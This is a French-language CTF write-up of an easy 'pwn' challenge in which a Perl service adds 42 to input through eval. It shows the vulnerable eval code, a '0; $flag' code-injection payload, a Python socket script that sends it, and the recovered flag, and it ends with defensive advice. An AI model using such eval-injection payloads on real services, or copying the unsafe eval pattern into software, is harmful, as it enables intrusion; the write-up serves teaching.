---
layout: post
title: "Jean D'Hack 2026 — Intro Sum [Pwn]"
date: 2026-02-01 10:30:00 +0100
categories: [CTF, Jean-DHack-2026]
tags: [pwn, perl, eval, code-injection, easy]
toc: true
---

> **CTF :** Jean D'Hack 2026 · **Catégorie :** Pwn · **Difficulté :** ⭐ Easy  
> **[← Retour à l'index du CTF](/portfolio/blog/posts/jean-dhack-ctf/)**

---

## Description du challenge

Le service propose un script Perl qui additionne 42 à un nombre saisi par l'utilisateur.  
L'objectif : lire le contenu de `flag.txt` sur le serveur.

**Connexion :** `nc pwn.jeanne-hack-ctf.org 9000`

---

## Analyse du code source

En inspectant le script Perl fourni, on repère immédiatement la partie critique :

```perl
while (1) {
  print "Enter a number to sum with 42: ";
  my $string = <STDIN>;
  chomp $string;
  my $result = eval "42 + " . $string;
  print "Result: " . $result . "\n";
}
```

### Ce qui cloche

La ligne `eval "42 + " . $string` exécute **dynamiquement** une chaîne construite en concaténant l'entrée utilisateur.  
En Perl, `eval` interprète la chaîne comme du **code Perl réel** — c'est une vulnérabilité d'**injection de code**.

---

## Exploitation

### Logique de l'injection

Le serveur va évaluer littéralement : `42 + <ce qu'on envoie>`.

Si on envoie `0; $flag`, la chaîne complète devient :

```perl
eval "42 + 0; $flag"
```

Perl exécute d'abord `42 + 0`, puis évalue `$flag` et retourne sa valeur — ce qui nous donne le contenu de la variable interne `$flag`.

### Script Python de résolution

Comme `nc` n'était pas disponible directement, j'ai automatisé l'interaction via un socket Python :

```python
import socket

HOST = "pwn.jeanne-hack-ctf.org"
PORT = 9000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# Lire le prompt
print(s.recv(1024).decode())

# Envoyer le payload
s.sendall(b"0; $flag\n")

# Recevoir la réponse
response = s.recv(1024).decode()
print(response)

s.close()
```

### Résultat

```
Enter a number to sum with 42:
Result: JDHACK{JeANnE_IN7rO_w1th_P3rL_3v4l}
```

---

## Flag

```
JDHACK{JeANnE_IN7rO_w1th_P3rL_3v4l}
```

---

## Ce que j'ai retenu

L'utilisation de `eval` sur une **entrée non filtrée** est une erreur critique dans n'importe quel langage.  
En Perl, Ruby, Python, JavaScript — la règle est la même : **ne jamais passer une entrée utilisateur dans `eval`**.

La vraie défense ici serait de parser numériquement l'entrée avec `int($string)` avant de l'utiliser, rejetant toute chaîne non numérique.
